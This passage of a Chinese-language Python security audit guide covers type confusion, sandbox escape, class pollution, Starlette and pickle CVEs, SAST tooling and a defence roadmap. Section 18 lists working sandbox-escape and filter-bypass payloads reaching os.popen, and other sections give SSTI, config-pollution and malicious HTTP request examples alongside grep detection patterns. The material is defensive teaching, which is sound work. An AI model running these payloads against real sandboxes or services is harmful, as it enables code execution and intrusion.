      - name: Generate SBOM
        run: |
          pip install cyclonedx-bom
          cyclonedx-py requirements -i requirements.txt -o sbom.json

      - name: Snyk Test (如有授权)
        uses: snyk/actions/python@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

### 17. 类型混淆攻击

#### 17.1 Pydantic / FastAPI 类型混淆

```python
# ❌ Pydantic v1 类型绕过
from pydantic import BaseModel

class User(BaseModel):
    role: str = "user"
    is_admin: bool = False

# 攻击：传入 JSON 字符串绕过类型检查
# {"role": "admin", "is_admin": "true"}  # 字符串 "true" 被 coerce 为 True

# ❌ Pydantic model_dump 只排除输出，不阻止输入
class UserProfile(BaseModel):
    name: str
    email: str
    is_admin: bool = False

    class Config:
        fields = {'is_admin': {'exclude': True}}  # 只排除输出

# ✅ Pydantic v2 严格模式
from pydantic import BaseModel, ConfigDict

class UserCreate(BaseModel):
    model_config = ConfigDict(
        strict=True,        # 禁止类型强制转换
        extra='forbid'      # 禁止额外字段
    )
    username: str
    email: str
    # 不包含 is_admin / role 字段

# ✅ 使用 Annotated 严格类型
from typing import Annotated
from pydantic import StringConstraints

Username = Annotated[str, StringConstraints(pattern=r'^[a-zA-Z0-9_]{3,20}$')]

class UserCreate(BaseModel):
    username: Username  # 严格正则验证
```

#### 17.2 Python 动态类型陷阱

```python
# ❌ bool("0") == True, bool("false") == True
is_active = bool(request.json.get("is_active"))  # "0" → True!

# ❌ int 精度问题
user_id = int(request.args.get("id"))  # 超大数 → 无异常

# ❌ JSON 解析类型混淆
import json
data = json.loads('{"count": 1e309}')  # float('inf') 无异常
data = json.loads('{"id": 999999999999999999999}')  # Python 大整数

# ✅ 显式类型验证
from pydantic import BaseModel, validator

class Query(BaseModel):
    is_active: bool
    count: int

    @validator('count')
    def validate_count(cls, v):
        if not 0 <= v <= 1000:
            raise ValueError('count out of range')
        return v
```

### 18. 沙箱逃逸技术

#### 18.1 Python 沙箱逃逸常见手法

```python
# ===== 基础：通过类继承链获取危险模块 =====

# 1. 获取所有子类
().__class__.__bases__[0].__subclasses__()

# 2. 查找包含 os / subprocess 的子类
for i, cls in enumerate(().__class__.__bases__[0].__subclasses__()):
    if 'wrap' in str(cls):  # _wrap_close 通常在索引 ~140
        print(i, cls)

# 3. 利用 __globals__ 获取 os 模块
().__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()

# ===== 绕过 import 限制 =====

# 4. 通过 __builtins__
__builtins__.__import__('os').popen('id').read()

# 5. 通过 exec + 变量名混淆
exec('__import__("os").system("id")')

# 6. 通过 getattr 链
getattr(getattr(getattr((), '__class__'), '__bases__')[0], '__subclasses__')()

# ===== 绕过关键字过滤 =====

# 7. 字符串拼接绕过黑名单
func = '__imp' + 'ort__'
getattr(__builtins__, func)('os').popen('id').read()

# 8. hex / oct 编码
'\x6f\x73'  # "os"
'\137\137\151\155\160\157\162\164\137\137'  # "__import__"

# 9. reversed 字符串
eval('"so".__import__("os").popen("id").read()')  # 不直接可用
getattr(__builtins__, '__tropmi__'[::-1])('os').popen('id').read()

# 10. format 格式化
"{0.__class__.__bases__[0].__subclasses__()}".format("")

# ===== 高级：利用内置对象 =====

# 11. 通过 type() 创建新类
type('Evil', (), {'__init__': lambda self: __import__('os').system('id')})()

# 12. 通过 bytes / bytearray
bytes.fromhex('6f73')  # b'os'

# 13. 通过 dict 键访问
__builtins__['__import__']('os')  # 如果 __builtins__ 是 dict
```

#### 18.2 RestrictedPython / Jinja2 沙箱绕过

```python
# ===== RestrictedPython 沙箱 =====

# ❌ RestrictedPython 默认配置不足
from RestrictedPython import compile_restricted, safe_globals
code = 'result = "".__class__.__mro__[1].__subclasses__()'  # 可能绕过

# ✅ 严格沙箱配置
from RestrictedPython import compile_restricted, safe_globals
from RestrictedPython.Guards import safer_getattr

def safer_getattr_guard(obj, name, default=None, getattr=getattr):
    # 阻止访问 __ 开头属性
    if name.startswith('_'):
        raise AttributeError(f"Forbidden attribute: {name}")
    return getattr(obj, name, default)

safe_globals.update({
    '_getattr_': safer_getattr_guard,
    '_getitem_': lambda obj, key: obj[key],
    '_write_': lambda obj: obj,
})

# ===== Jinja2 SandboxedEnvironment =====

from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
# 默认已阻止：
# - 访问以 _ 开头的属性
# - 调用危险的内置函数
# - 访问 __mro__、__class__ 等

# ❌ 但某些版本可通过以下绕过：
# {{ lipsum.__globals__ }}  # 旧版本可能泄露
# {{ cycler.__init__.__globals__.os.popen('id').read() }}  # 旧版本

# ✅ 额外安全措施
from jinja2.sandbox import ImmutableSandboxedEnvironment

env = ImmutableSandboxedEnvironment()
# 在渲染时冻结所有对象，防止通过 mutable 属性修改
```

**沙箱逃逸审计 grep：**

```bash
grep -rn 'exec(\|eval(\|compile(\|__import__\|__builtins__' --include='*.py' . | grep -v 'test\|venv'
grep -rn 'RestrictedPython\|SandboxedEnvironment\|compile_restricted' --include='*.py' .
grep -rn 'subprocess\|os\.system\|os\.popen' --include='*.py' . | grep -v 'test\|venv\|#'
```

### 19. 安全审计工具（2025-2026 更新）

#### 19.1 Bandit（Python 专用 SAST）

```bash
# 安装
pip install bandit

# 基础扫描
bandit -r src/ -f json -o report.json
bandit -r src/ -f txt -o report.txt

# 只显示高/中危
bandit -r src/ -ll -ii

# 跳过特定检查
bandit -r src/ --skip B101,B311

# 自定义配置文件
# .bandit.yml
targets:
  - src
skips: ['B101', 'B311']
severity: low

# 与 pre-commit 集成
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/PyCQA/bandit
    rev: '1.8.0'
    hooks:
      - id: bandit
        args: ["-c", "pyproject.toml"]
        additional_dependencies: ["bandit[toml]"]
```

#### 19.2 Semgrep（多语言 SAST）

```bash
# 安装
pip install semgrep

# Python 专用规则集扫描
semgrep --config p/python src/
semgrep --config p/owasp-top-ten src/
semgrep --config p/flask src/
semgrep --config p/django src/
semgrep --config p/jwt src/
semgrep --config p/sql-injection src/
semgrep --config p/command-injection src/

# 组合扫描
semgrep --config p/python --config p/owasp-top-ten --config p/flask src/ --json -o semgrep.json

# 自定义规则示例（检测不安全的 Pydantic 配置）
# pydantic-safe.yaml
rules:
  - id: pydantic-extra-allow
    patterns:
      - pattern: |
          class $CLASS(BaseModel):
              ...
              model_config = ConfigDict(extra='allow')
    message: "Pydantic 模型允许额外字段 → 批量赋值风险"
    severity: WARNING
    languages: [python]

  - id: flask-debug-true
    patterns:
      - pattern: app.run(..., debug=True, ...)
    message: "Flask 生产环境不应启用 debug 模式"
    severity: ERROR
    languages: [python]
```

#### 19.3 CodeQL for Python

```bash
# 安装 CodeQL CLI
# https://github.com/github/codeql-cli-binaries

# 创建数据库
codeql database create python-db --language=python --source-root=src/

# 使用标准查询扫描
codeql database analyze python-db \
  python-security-and-quality \
  --format=sarif-latest \
  --output=codeql-results.sarif

# 常用查询套件
codeql database analyze python-db \
  codeql/python-queries:Security \
  --format=csv \
  --output=codeql-security.csv

# 上传到 GitHub Security tab
gh codeql upload-sarif codeql-results.sarif
```

**CodeQL Python 安全查询示例：**

```ql
// 检测 pickle 反序列化
import python

from Call call, Name target
where
  call.getCallee() = target and
  target.getId() = "loads" and
  target.getScope().(Attribute).getName() = "pickle"
select call, "Potential unsafe pickle deserialization"
```

#### 19.4 工具对比与选择

| 工具 | 类型 | 优势 | 适用场景 |
|------|------|------|---------|
| Bandit | Python SAST | 快速、零配置、Python 专用 | 日常开发 / pre-commit |
| Semgrep | 多语言 SAST | 自定义规则、多框架规则集 | CI/CD 管道 / 深度审计 |
| CodeQL | 语义分析 | 数据流追踪、高精度 | 大型项目 / GitHub 集成 |
| pip-audit | 依赖扫描 | OSV 数据库、精确 CVE 匹配 | 依赖安全 |
| OSV Scanner | 依赖扫描 | 多语言、SBOM 支持 | 全栈项目 |
| Ruff | Linter + 格式化 | 极速、含安全规则 (S 系列) | 日常开发替代 flake8 |

#### 19.5 Ruff 安全规则（2025 推荐）

```bash
# Ruff 替代 flake8 + isort + bandit 部分功能
pip install ruff

# 扫描含安全规则
ruff check src/ --select S    # flake8-bandit 兼容规则
ruff check src/ --select ALL  # 全部规则

# 常用安全规则
# S101  — assert 检测
# S102  — exec() 检测
# S105  — 硬编码密码
# S106  — 硬编码密码（变量赋值）
# S324  — hashlib 不安全函数
# S602  — subprocess shell=True
# S603  — subprocess 不完整参数
# S605  — os.system
# S607  — os.system 不完整路径
# S608  — SQL 注入
# S612  — logging.config.listen
# S701  — Jinja2 自动转义关闭
```

### 20. 更新 MITRE ATT&CK 映射（2025-2026）

| 战术 | Technique | Python 相关场景 | 更新说明 |
|------|-----------|----------------|---------|
| Initial Access | T1190 | SSTI (Jinja2/Django)、SQL 注入、Flask debug=True、路径穿越读取配置 | 新增 FastAPI 参数污染 |
| Execution | T1059.006 | `eval`/`exec`、`pickle` RCE、`subprocess shell=True`、`os.system`、反序列化 RCE | 新增 `dill`/`jsonpickle` 利用链 |
| Persistence | T1053 | Flask debug 后门、模板注入持久化、`__init__.py` 恶意代码 | 新增 pip `--user` 安装持久化 |
| Persistence | T1574.001 | Python path hijacking、`PYTHONPATH` 注入、`.pth` 文件后门 | 新增 |
| Privilege Escalation | T1548 | Django `is_admin` 批量赋值、Pydantic 类型混淆、JWT 伪造 | 新增 Pydantic v2 绕过 |
| Defense Evasion | T1140 | pickle opcode 混淆、base64 编码 payload、`compile()` + `exec` | 新增沙箱逃逸技术 |
| Defense Evasion | T1027.005 | Python 混淆工具 (pyarmor/pyminifier)、`__pycache__` 清理 | 新增 |
| Credential Access | T1212 | SQL 注入提取凭证、session cookie 伪造、Flask SECRET_KEY 泄露 | 新增 Django session 反序列化 |
| Credential Access | T1552.001 | 硬编码密钥 (`SECRET_KEY = "..."`)、`.env` 泄露、日志泄露 | 新增 |
| Discovery | T1082 | `os.uname()`、`platform.system()` 信息收集、`config` 对象泄露 | 新增 SSTI config 泄露 |
| Lateral Movement | T1021 | SSRF 内网探测、Redis 未授权 + pickle RCE | 新增 |
| Exfiltration | T1041 | SSRF 数据外泄、DNS 隧道 (`scapy`) | 新增 |
| Exfiltration | T1048 | 通过 `requests.post()` 外泄数据到攻击者服务器 | 新增 |
| Impact | T1486 | Python 勒索软件 (文件加密) | 新增 |

### 21. 完整审计流程（2025 推荐版）

```bash
# ===== Step 1: 自动化扫描 =====

# Ruff 快速扫描（含安全规则）
ruff check src/ --select S,ERA,T20 --output-format json > ruff.json

# Bandit 深度扫描
bandit -r src/ -f json -o bandit.json --exclude tests/,venv/,migrations/

# Semgrep 框架专项扫描
semgrep --config p/python --config p/flask --config p/django \
  --config p/owasp-top-ten src/ --json -o semgrep.json

# ===== Step 2: 依赖安全 =====

pip-audit -r requirements.txt --desc
osv-scanner scan --lockfile=requirements.txt

# ===== Step 3: 手工审计关键点 =====

# 命令注入
grep -rn 'os\.system\|subprocess.*shell=True\|eval(\|exec(' --include='*.py' src/

# SQL 注入
grep -rn '\.raw(\|\.extra(\|cursor\.execute(f"' --include='*.py' src/

# 反序列化
grep -rn 'pickle\.loads\|yaml\.load(\|shelve\.open' --include='*.py' src/

# SSTI
grep -rn 'render_template_string\|from_string(' --include='*.py' src/

# 硬编码密钥
grep -rn 'SECRET_KEY\s*=\s*["\x27]' --include='*.py' src/
grep -rn 'PASSWORD\s*=\s*["\x27]' --include='*.py' src/

# SSRF
grep -rn 'requests\.get(\(request\.\)' --include='*.py' src/

# ===== Step 4: 生成报告 =====

# 合并所有扫描结果
python -c "
import json
results = []
for f in ['ruff.json', 'bandit.json', 'semgrep.json']:
    try:
        with open(f) as fp:
            results.append(json.load(fp))
    except: pass
with open('security-report.json', 'w') as fp:
    json.dump(results, fp, indent=2)
"
```

### 22. 2025-2026 Python 关键 CVE 速查

| CVE | 组件 | 类型 | CVSS | 关键信息 |
|-----|------|------|------|----------|
| CVE-2025-64459 | Django ORM | SQL 注入 | **Critical** | `filter()`/`exclude()`/`get()` 的 `_connector` 参数注入；影响 Django ≤5.2.7/≤5.1.13/≤4.2.25；修复版本 5.2.8/5.1.14/4.2.26 |
| CVE-2025-64458 | Django | 安全缺陷 | — | LLM 辅助发现的 Django 安全问题 |
| CVE-2025-64460 | Django | 安全缺陷 | — | LLM 辅助发现的 Django 安全问题 |
| CVE-2026-6873 | Django | 签名 Cookie Salt | — | Signed cookie salt 验证漏洞 |
| CVE-2025-62727 | Starlette | DoS (CPU 耗尽) | **Critical** | `FileResponse`/`StaticFiles` 中 HTTP `Range` 头二次时间解析；修复版本 starlette≥0.49.1 |
| CVE-2026-48710 | Starlette | 认证绕过 (BadHost) | **Critical** | Host 头注入单字符绕过路径授权；影响 FastAPI/vLLM/LiteLLM/MCP 服务器；修复版本 starlette≥0.46.2/1.0.1+, FastAPI≥0.116.0 |
| CVE-2025-66221 | Flask | 安全缺陷 | Medium (5.3) | Flask 3.1.2 漏洞 |
| CVE-2026-21860 | Flask | 安全缺陷 | Medium (5.3) | Flask 漏洞 |
| CVE-2025-3248 | Langflow (FastAPI) | 未授权 RCE | **Critical** | `/api/v1/validate/code` 端点代码执行 |
| CVE-2025-68481 | FastAPI Users | OAuth 安全 | — | OAuth 组件安全问题，修复版本 15.0.2 |
| CVE-2025-14546 | fastapi-sso | CSRF | — | 版本 <0.19.0 |
| CVE-2026-1299 | CPython `email` | Header Injection | Medium | `BytesGenerator` 未引用换行符导致邮件头注入 |
| CVE-2025-12781 | CPython `base64` | 输入验证绕过 | Medium (5.3) | `b64decode()` 等函数允许畸形数据通过验证（仅在使用自定义字母表时可利用） |
| CVE-2025-61622 | PyFory | 反序列化 RCE | — | 不安全 pickle 反序列化 |
| CVE-2025-1716 | Picklescan | 静态分析绕过 | — | 恶意 ML 模型通过 `pip.main()` 绕过 Picklescan |
| CVE-2025-3108 | LlamaIndex | 反序列化 RCE | **Critical** | `JsonPickleSerializer` 组件 v0.12.27+ |
| CVE-2026-0763 | GPT Academic | Pickle RCE | **Critical (9.8)** | v3.91 未认证 pickle 反序列化远程代码执行 |

**审计 grep（CVE 相关模式）：**

```bash
# Django _connector 注入（CVE-2025-64459）
grep -rn '\.filter(.*\*\*' --include='*.py' . | grep -v 'test'
grep -rn '_connector' --include='*.py' .

# Starlette Host 头信任（CVE-2026-48710 BadHost）
grep -rn 'request\.headers\["Host"\]\|request\.url\.hostname\|Middleware.*Host' --include='*.py' .

# Langflow 风格代码执行端点
grep -rn 'validate.*code\|exec.*request\|eval.*request' --include='*.py' .

# Pickle in ML pipeline
grep -rn 'torch\.load\|pickle\.loads.*model\|\.pkl' --include='*.py' .
```

### 23. Python Class Pollution（原型链污染）

Python 的类继承机制存在与 JavaScript Prototype Pollution 等价的漏洞类别。攻击者通过精心构造的输入（如 JSON），沿 `__class__.__init__.__globals__` 等属性链修改类级别属性，影响所有实例。

#### 23.1 攻击原理

```python
# ===== Python Class Pollution 基本原理 =====

# 攻击前提：应用接受 JSON 输入并用于合并/更新对象属性
# 类似 JavaScript 的 Object.assign(target, user_input)

# 危险模式：递归合并用户输入
def merge(dst, src):
    for key, value in src.items():
        if hasattr(dst, key) and isinstance(value, dict):
            merge(getattr(dst, key), value)
        else:
            setattr(dst, key, value)  # 可设置 __class__ 等属性

# 攻击 payload（JSON）：
# {
#   "__class__": {
#     "__init__": {
#       "__globals__": {
#         "SECRET_KEY": "attacker_controlled",
#         "DEBUG": true,
#         "os": {"<module 'os'>"}
#       }
#     }
#   }
# }
```

#### 23.2 实战利用场景

```python
# ===== Flask Config 污染 =====

# Flask app.config 是一个 dict 子类
# 如果存在 config 更新端点且接受用户输入：
app.config.update(user_json)  # 危险！

# 攻击 payload：
# {"SECRET_KEY": "pwned", "DEBUG": true, "SESSION_COOKIE_SECURE": false}

# ===== Django Settings 覆盖 =====
# 通过 __class__ 属性链污染 django.conf.settings
# 可覆盖 ALLOWED_HOSTS、SECRET_KEY、DATABASES 等

# ===== Pydantic 模型污染 =====
class User(BaseModel):
    name: str
    role: str = "user"

# 如果使用 model.copy(update=user_data) 而非 model.model_copy(update=...)
# Pydantic v1 的 .copy(update=) 不验证字段类型
```

#### 23.3 检测工具与研究

| 工具/研究 | 类型 | 说明 |
|-----------|------|------|
| **Pyrl** | 静态分析框架 | 首个大规模 Python Class Pollution 检测工具（学术论文 "The First Large-Scale Systematic Study of Python Class Pollution"） |
| **Classa** | 检测工具 | KTH 皇家理工学院开发的 Class Pollution 检测工具 |
| **Semgrep 自定义规则** | SAST 规则 | 检测递归 merge/setattr 模式 |

**Semgrep 检测规则：**

```yaml
rules:
  - id: python-class-pollution-merge
    patterns:
      - pattern: |
          def $FUNC($dst, $src):
              ...
              setattr($obj, $key, $value)
      - pattern-not: |
          def $FUNC($dst, $src):
              ...
              if $key.startswith("_"):
                  ...
    message: "潜在 Class Pollution：递归合并未过滤 __ 开头属性"
    severity: WARNING
    languages: [python]

  - id: python-unsafe-dict-update
    patterns:
      - pattern: $DICT.update($USER_INPUT)
      - pattern-not: |
          $DICT.update({$SAFE_KEY: $SAFE_VALUE})
    message: "字典更新使用用户输入 → 潜在属性覆盖"
    severity: WARNING
    languages: [python]
```

**防御措施：**

```python
# ✅ 安全的递归合并 — 过滤危险属性
def safe_merge(dst, src):
    BLOCKED_KEYS = {'__class__', '__init__', '__globals__', '__builtins__',
                    '__dict__', '__mro__', '__bases__', '__subclasses__'}
    for key, value in src.items():
        if key.startswith('_') or key in BLOCKED_KEYS:
            continue  # 跳过危险键
        if hasattr(dst, key) and isinstance(value, dict) and isinstance(getattr(dst, key), dict):
            safe_merge(getattr(dst, key), value)
        else:
            setattr(dst, key, value)

# ✅ Pydantic v2 严格模式（禁止额外字段）
class SafeModel(BaseModel):
    model_config = ConfigDict(extra='forbid')
    name: str
    role: str = "user"

# ✅ 使用白名单而非黑名单
ALLOWED_CONFIG_KEYS = {'theme', 'language', 'notifications'}
for key in user_json:
    if key in ALLOWED_CONFIG_KEYS:
        config[key] = user_json[key]
```

**审计 grep：**

```bash
grep -rn 'setattr(\|\.update(\|__class__\|__globals__\|__builtins__' --include='*.py' . | grep -v 'test\|venv'
grep -rn 'def merge\|def deep_update\|def deep_merge' --include='*.py' .
grep -rn 'model\.copy(update=' --include='*.py' .  # Pydantic v1 不安全模式
```

#### 23.4 参考资源

| 资源 | 链接 |
|------|------|
| Pyrl 学术论文 | [The First Large-Scale Systematic Study of Python Class Pollution](https://jackfromeast.github.io/assets/Pyrl.pdf) |
| Abdulrah33m 博客 | [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/) |
| Classa (KTH) | [Uncovering Class Pollution in Python](https://kth.diva-portal.org/smash/get/diva2:2051711/FULLTEXT01.pdf) |
| HackTricks | [Class Pollution: Python's Prototype Pollution](https://hacktricks.wiki/en/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.html) |
| YesWeHack Dojo | [Python Pitfalls — Class Pollution](https://dojo-yeswehack.com/learn/python-pitfalls/class_pollution) |
| Flask 实例 | [Prototype Pollution in Flask](https://www.lanmaster53.com/2023/02/01/prototype-polution-in-flask/) |

### 24. Starlette / FastAPI 安全审计专项（2025-2026）

#### 24.1 CVE-2026-48710 (BadHost) 深度分析

```
漏洞原理：
1. Starlette 在处理 HTTP 请求时信任 Host 头用于路由构造
2. 中间件和端点读取的路径与实际路由路径不一致
3. 攻击者在 Host 头注入单个字符即可绕过路径级别授权

攻击示例：
GET /admin/dashboard HTTP/1.1
Host: evil%00target.com  ← 注入空字节或特殊字符

结果：路由匹配到 /admin/dashboard，但中间件读取的路径被修改
      → 路径授权检查被绕过

影响范围：
- FastAPI 应用（因基于 Starlette）
- vLLM、LiteLLM 等 AI 推理服务器
- MCP (Model Context Protocol) 服务器（MCP 规范要求未认证 OAuth 发现端点）
- 估计影响数百万 AI 代理

修复：
- Starlette ≥ 0.46.2 或 1.0.1+
- FastAPI ≥ 0.116.0
```

**FastAPI 路径授权安全编码：**

```python
# ❌ 仅依赖 Host 头的路由授权
@app.middleware("http")
async def auth_middleware(request: Request, call_next):
    if request.url.hostname not in ALLOWED_HOSTS:  # Host 头可被伪造
        return JSONResponse(status_code=403)
    return await call_next(request)

# ✅ 使用 X-Forwarded-Host + 信任代理配置
from starlette.middleware.trustedhost import TrustedHostMiddleware

app.add_middleware(TrustedHostMiddleware, allowed_hosts=["example.com"])

# ✅ 路径授权不依赖 Host 头
@app.middleware("http")
async def path_auth_middleware(request: Request, call_next):
    # 直接检查 request.url.path，不依赖 hostname
    path = request.url.path
    if path.startswith("/admin") and not is_admin(request):
        return JSONResponse(status_code=403)
    return await call_next(request)
```

#### 24.2 CVE-2025-62727 (Range DoS) 深度分析

```
漏洞原理：
1. Starlette FileResponse/StaticFiles 解析 HTTP Range 头
2. 解析算法为二次时间复杂度（O(n²)）
3. 精心构造的 Range 头可导致 CPU 100% 占用

攻击示例：
GET /static/large-file.pdf HTTP/1.1
Range: bytes=0-1,2-3,4-5,...[数千个范围]...999998-999999

影响：每个请求导致 CPU 疯狂计算 → 服务拒绝

修复：
- Starlette ≥ 0.49.1
```

**FastAPI StaticFiles 安全配置：**

```python
# ✅ 安全的静态文件配置
from fastapi import FastAPI
from fastapi.staticfiles import StaticFiles

app = FastAPI()

# 限制 Range 头处理
@app.middleware("http")
async def limit_range_headers(request: Request, call_next):
    range_header = request.headers.get("range", "")
    if range_header.count(",") > 100:  # 限制范围数量
        return Response(status_code=400, content="Too many ranges")
    return await call_next(request)

# 或使用 Nginx 等反向代理处理静态文件（推荐生产环境）
```

### 25. Pickle 反序列化攻击升级 — ML/AI 供应链

#### 25.1 ML 模型文件投毒

```python
# ===== 2025-2026 趋势：ML/AI 管道中的 Pickle 攻击 =====

# 攻击向量：
# 1. 恶意 .pkl/.pt/.bin 模型文件上传到 Hugging Face 等模型仓库
# 2. torch.load() 默认使用 pickle 反序列化
# 3. Picklescan 等工具自身存在绕过漏洞

# ❌ 危险：torch.load 未限制
import torch
model = torch.load("untrusted_model.pt")  # pickle 反序列化 → RCE

# ❌ 危险：pickle.loads 从模型权重文件
import pickle
with open("model_weights.pkl", "rb") as f:
    weights = pickle.load(f)  # 如果文件被篡改 → RCE

# ✅ 安全：torch.load 使用 weights_only
model = torch.load("model.pt", weights_only=True, map_location="cpu")

# ✅ 安全：safetensors 格式（推荐替代 pickle）
from safetensors.torch import load_file
weights = load_file("model.safetensors")  # 无反序列化风险

# ✅ 安全：使用 Pickle 级别的 Unpickler 限制
import pickle
class SafeUnpickler(pickle.Unpickler):
    ALLOWED_MODULES = {'torch', 'numpy', 'collections'}
    def find_class(self, module, name):
        if module.split('.')[0] not in self.ALLOWED_MODULES:
            raise pickle.UnpicklingError(f"Blocked: {module}.{name}")
        return super().find_class(module, name)
```

#### 25.2 Picklescan 绕过技术（2025 研究）

```python
# ===== JFrog 发现 Picklescan 3 个零日（CVSS 9.3）=====

# 绕过方法 1：pip.main() 调用（CVE-2025-1716）
# Picklescan 不检测 pickle 中调用 pip.main() 安装恶意包
# 攻击者模型文件：pickle opcode 调用 pip.main(["install", "malicious_pkg"])

# 绕过方法 2：混淆 opcode
# 使用非常规 pickle opcode 序列绕过静态分析

# 绕过方法 3：多层嵌套
# 外层 pickle 看似安全，内层通过 base64/压缩编码隐藏恶意 payload

# ✅ 防御：多层防护
# 1. 使用 safetensors 格式（完全避免 pickle）
# 2. torch.load(weights_only=True)
# 3. 沙箱环境加载模型（Docker + seccomp + 网络隔离）
# 4. 模型来源验证（签名检查）
# 5. 结合动态分析（AnyRun/Cuckoo 执行模型加载并监控行为）
```

**审计 grep（ML 安全）：**

```bash
grep -rn 'torch\.load\|pickle\.loads\|pickle\.load\|\.pkl\|\.pt' --include='*.py' . | grep -v 'weights_only\|test\|SafeUnpickler'
grep -rn 'safetensors' --include='*.py' .  # 检查是否使用安全格式
grep -rn 'from_pretrained\|AutoModel\|AutoTokenizer' --include='*.py' .  # Hugging Face 模型加载
```

### 26. LLM 辅助漏洞发现

#### 26.1 实例：$5 Prompt 发现 6 个 Django 安全问题

```
研究员 ch4n3.yoon 使用 LLM 以 $5 成本发现：
- Django 框架 6 个安全问题
- 获得 2 个 CVE（CVE-2025-64458, CVE-2025-64460）
- 另获 CVE-2025-62727（FastAPI/Starlette）
- 赏金 $2,418

方法：
1. 提供目标框架源码给 LLM
2. Prompt 要求分析常见漏洞模式（注入、绕过、逻辑缺陷）
3. LLM 标记可疑代码位置
4. 人工验证并提交
```

#### 26.2 对 Python 代码审计的影响

```python
# ===== LLM 辅助审计 Prompt 模板 =====

# Prompt 1：漏洞模式扫描
"""
分析以下 Python 代码，查找以下漏洞类别：
1. SQL 注入（字符串拼接 SQL、raw() 调用）
2. 命令注入（os.system、subprocess shell=True、eval/exec）
3. 反序列化（pickle.loads、yaml.load）
4. SSTI（render_template_string、from_string）
5. 路径穿越（用户输入拼路径、未验证的文件操作）
6. SSRF（用户可控 URL）
7. 批量赋值（**kwargs、ModelForm fields='__all__'）
8. Class Pollution（递归合并、setattr 用户输入）

对每个发现，给出：
- 文件:行号
- 漏洞类型和严重性
- 攻击场景
- 修复建议
"""

# Prompt 2：特定 CVE 模式匹配
"""
检查以下代码是否存在与 CVE-2025-64459 类似的模式：
Django ORM filter()/exclude()/get() 中使用 **kwargs 传递用户输入，
特别关注 _connector 参数是否可被用户控制。
"""

# Prompt 3：依赖安全审查
"""
分析 requirements.txt 中的依赖：
1. 标记已知 CVE（使用 pip-audit 数据）
2. 检查是否存在更安全的替代方案
3. 识别弃用/停止维护的包
"""
```

### 27. 中文社区精华参考

| 资源 | 来源 | 关键内容 |
|------|------|----------|
| [Langflow RCE 漏洞 CVE-2025-3248 分析](https://m.freebuf.com/articles/web/444713.html) | FreeBuf | FastAPI 生态未授权 RCE 漏洞深度分析 |
| [Python 安全和代码审计资料收集](https://github.com/bit4woo/python_sec) | GitHub/先知社区 | Pickle RCE、Django SECRET_KEY 泄漏、Python Web 安全总结 |
| [n8n Python 代码节点沙箱绕过](https://www.gm7.org/archives/26711) | gm7.org | Pyodide 沙箱通过替换 os.system 黑名单的绕过方法 |
| [Python 漏洞库](https://avd.aliyun.com/product?prod=python) | 阿里云 AVD | CPython CVE 集合：CVE-2026-1299、CVE-2025-12781 等 |
| [Python 原型链污染研究](https://blog.abdulrah33m.com/prototype-pollution-in-python/) | Abdulrah33m | Python Class Pollution 攻击原理与实战利用 |
| [Python 原型链污染利用与防御](https://www.researchgate.net/publication/382370055_Exploitation_and_prevention_of_Python_prototype_chain_pollution) | ResearchGate | 学术论文：利用技术与防御策略 |
| [CPython 8 CVE Q1 2026 公告](https://seclists.org/oss-sec/2026/q1/111) | Seclists | email 模块头注入 (CVE-2026-1299) 等多个 CPython 漏洞 |
| [LLM 发现 Django 漏洞](https://new-blog.ch4n3.kr/llm-found-security-issues-from-django-en/) | ch4n3.yoon | $5 Prompt 发现 6 个安全问题、$2418 赏金 |

### 28. 防御升级路线图

| 优先级 | 措施 | 说明 |
|--------|------|------|
| **P0** | 升级 Starlette≥1.0.1 / FastAPI≥0.116.0 | 修复 BadHost (CVE-2026-48710) 认证绕过 |
| **P0** | 升级 Django≥5.2.8/5.1.14/4.2.26 | 修复 SQL 注入 (CVE-2025-64459) |
| **P0** | 审计 `filter(**user_input)` 模式 | CVE-2025-64459 攻击面扫描 |
| **P1** | ML 管道迁移到 safetensors | 替代 pickle 的模型文件格式 |
| **P1** | 添加 Class Pollution 检测规则 | Semgrep 规则扫描递归 merge/setattr |
| **P1** | 升级 Starlette≥0.49.1 | 修复 Range DoS (CVE-2025-62727) |
| **P2** | 审计 ML 模型加载点 | torch.load→weights_only=True |
| **P2** | 配置 TrustedHostMiddleware | FastAPI 应用添加 Host 头验证 |
| **P2** | 集成 LLM 辅助审计到 CI/CD | 自动化漏洞模式匹配 |
| **P3** | CPython 升级至最新补丁 | 修复 email/base64 模块漏洞 |
| **P3** | 审计 Picklescan 使用 | 确认版本覆盖 JFrog 零日修复 |
